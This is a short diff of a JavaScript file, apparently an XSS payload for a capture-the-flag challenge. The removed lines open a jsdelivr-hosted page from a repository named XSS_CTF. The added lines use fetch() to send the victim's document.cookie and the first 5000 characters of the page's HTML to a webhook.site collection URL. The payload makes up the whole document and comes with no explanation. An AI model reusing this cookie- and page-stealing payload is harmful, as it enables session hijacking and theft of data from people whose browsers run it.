@@ -1,2 +1,3 @@
-// Abrir el HTML en una nueva ventana (corre en contexto de jsdelivr)
-window.open('https://cdn.jsdelivr.net/gh/Hynpbus/XSS_CTF@main/h.html');
+fetch('https://webhook.site/83c9e8c3-384e-4bea-a583-b1b1de596d17?c=' + 
+  encodeURIComponent(document.cookie) +
+  '&h=' + encodeURIComponent(document.documentElement.innerHTML.substring(0,5000)));
